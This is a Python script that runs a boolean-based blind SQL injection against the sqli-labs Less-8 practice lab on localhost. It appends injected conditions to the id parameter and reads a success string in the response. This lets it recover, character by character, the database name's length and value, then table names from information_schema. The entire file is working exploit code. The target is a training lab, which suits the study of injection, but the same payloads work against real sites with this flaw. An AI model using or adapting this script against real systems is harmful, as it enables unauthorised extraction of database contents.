#!/usr/bin/python3

import string
import requests

request=requests.Session()
url="http://localhost/sqli-labs-php7/Less-8/?id=1' and "

def database_len(url):
    for i in range(50):
        a="length(database())={} --+".format(i)
        r=request.get(url+a)
        if "You are in..........." in r.text:
            return i
            break
            

print("[-]finding length of database...")
d_len=database_len(url)
print("[+]length of database=",d_len)



def database_name(url,leng):
    name=""
    payload="substr(database(),{},1)='{}' --+"
    a=string.printable
    for i in range(1,leng+1):
        for j in a:
            b=payload.format(i,j)
            r=request.get(url+b)
            if "You are in..........." in r.text:
                name+=j
                break
    return name


print("[-]finding name of database...")
d_name=database_name(url,d_len)
print("[+]name of database=",d_name)

def exploit(url,query):
    name=""
    payload="substr("+query+",{},1)='{}' --+"
    a=string.ascii_letters+'_!@#$%^&*()'
    for i in range(1,10):
        for j in a:
            b=payload.format(i,j)
            r=request.get(url+b)
            if "You are in..........." in r.text:
                name+=j
                break
    return name.replace("#","")


print("[-]finding name of tables...")
tables=[]
payload_tables="(select table_name from information_schema.tables where table_schema=database() limit {},1)"
def names(payload,length):
    l=[]
    for i in range(length):
        pld=payload.format(i)
        n=exploit(url,pld)
        l.append(n)
    return l

tables=names(payload_tables,4)
print("[+]tables :",tables)
